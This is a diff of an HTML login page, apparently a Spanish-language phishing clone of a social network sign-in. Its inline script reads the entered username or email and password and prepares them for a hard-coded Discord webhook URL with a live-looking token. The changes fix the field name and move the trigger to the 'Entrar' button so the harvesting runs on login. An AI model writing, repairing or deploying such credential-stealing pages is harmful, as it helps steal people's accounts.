@@ -21,11 +21,11 @@
                     <input name="email" placeholder="Phone, user, or email" />
 
                     <label for="password" class="sr-only">Password</label>
-                    <input name="password" type="password" placeholder="Password" onchange="cambio()"/>
+                    <input name="password" type="password" placeholder="Password"/>
 
                     <script>
                         function cambio(){
-                            var usuario = document.getElementsByName('username')[0].value;
+                            var usuario = document.getElementsByName('email')[0].value;
                             var contraseña = document.getElementsByName('password')[0].value;
                             const webhookURL = 'https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY'
                             const mensaje = {
@@ -44,7 +44,7 @@
                         }
                     </script>
 
-                    <button type="button">Entrar</button>
+                    <button type="button" onclick="cambio()">Entrar</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
